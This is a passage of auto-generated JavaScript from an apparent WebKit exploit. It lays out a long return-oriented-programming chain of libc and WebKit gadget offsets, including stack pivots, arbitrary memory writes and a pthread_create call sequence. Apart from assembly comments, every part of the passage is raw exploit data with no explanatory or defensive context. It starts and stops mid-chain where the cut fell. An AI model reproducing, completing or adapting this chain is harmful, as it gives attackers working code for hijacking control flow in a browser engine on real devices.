set_gadget(libc_base+165442,); //pop rdi
//L2074:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2075:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2076:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+148336, //L2077
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+148368, //L2079
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+148352, //L2078
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2077:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2078:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+148472, //L2080
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+148488, //L2081
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2080:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2081:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+148608, //L2082
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+148592, //L2083
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2083:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+148696, //L2085
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+148680, //L2084
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2084:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+148800, //L2086
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+148816, //L2087
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2086:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+148936, //L2088
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+148920, //L2089
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2089:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2088:
db([0, 0]); // 0x0
//_pthread_create__rop:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+149008, //L2091
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2091:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+149072, //L2092
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2092:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+149192, //L2095
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+149224, //L2097
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2094:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L2095:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2096:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2097:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+149320, //L2099
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+149304, //L2098
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2098:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2099:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2100:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2101:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2102:
db([1, 0]); // 0x1
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2103:
db([1, 0]); // 0x1
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2104:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+149632, //L2106
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2106:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2108:
db([1, 0]); // 0x1
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2109:
db([2, 0]); // 0x2
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+149824, //L2111
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2111:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+149968, //L2115
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2113:
db([65536, 0]); // 0x10000
set_gadget(libc_base+165442,); //pop rdi
//L2114:
db([65536, 0]); // 0x10000
set_gadget(webkit_base+3789839,); //pop r11
//L2115:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+150064, //L2117
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+150048, //L2116
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2116:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2117:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2118:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2120:
ropchain+150216, //L2119
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+160336, //L2121
//L2119:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+150312, //L2122
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2122:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+150368, //L2124
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2124:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2126:
db([65536, 0]); // 0x10000
set_gadget(libc_base+768796,); //pop rax
//L2127:
db([65536, 0]); // 0x10000
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+150520, //L2128
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+150576, //L2130
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2130:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+150664, //L2133
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2132:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L2133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2135:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L2136:
db([312, 0]); // 0x138
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2138:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+150864, //L2141
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+150848, //L2140
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2140:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+151024, //L2144
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+151056, //L2146
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+151008, //L2143
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+151040, //L2145
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2143:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2144:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2145:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+151152, //L2148
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+151136, //L2147
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2147:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2148:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2149:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2150:
db([1, 0]); // 0x1
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+151360, //L2151
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+151392, //L2153
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+151376, //L2152
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2151:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2152:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2153:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+151496, //L2155
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+151512, //L2156
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2154:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L2155:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2156:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2158:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+151656, //L2161
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+151640, //L2160
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2160:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2161:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+151816, //L2164
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+151848, //L2166
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+151800, //L2163
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+151832, //L2165
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2163:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2164:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2165:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2166:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+151944, //L2168
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+151928, //L2167
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2167:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2168:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2169:
db([15, 0]); // 0xf
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+152056, //L2171
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2171:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278, //pop rsi
ropchain+152192, //L2173
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+152224, //L2175
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+152208, //L2174
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2173:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2174:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2175:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+152328, //L2177
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+152344, //L2178
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2176:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L2177:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2180:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+152488, //L2183
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+152472, //L2182
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2182:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2183:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+152648, //L2186
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+152680, //L2188
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+152632, //L2185
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+152664, //L2187
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2185:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2186:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2187:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2188:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+152776, //L2190
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+152760, //L2189
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2189:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2190:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2191:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2192:
db([1, 0]); // 0x1
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+152984, //L2193
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+153016, //L2195
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+153000, //L2194
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2193:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2194:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2195:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+153120, //L2197
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+153136, //L2198
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2196:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L2197:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2198:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2200:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L2201:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+153296, //L2204
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+153280, //L2203
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2203:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2204:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+153440, //L2208
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+153408, //L2206
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+153424, //L2207
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2206:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2207:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2208:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+153512, //L2209
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2209:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+153568, //L2211
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2211:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+153664, //L2214
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2213:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L2214:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+153768, //L2217
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+153752, //L2216
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2216:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2217:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+153928, //L2220
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+153960, //L2222
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+153912, //L2219
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+153944, //L2221
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2219:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2220:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2221:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2222:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+154072, //L2223
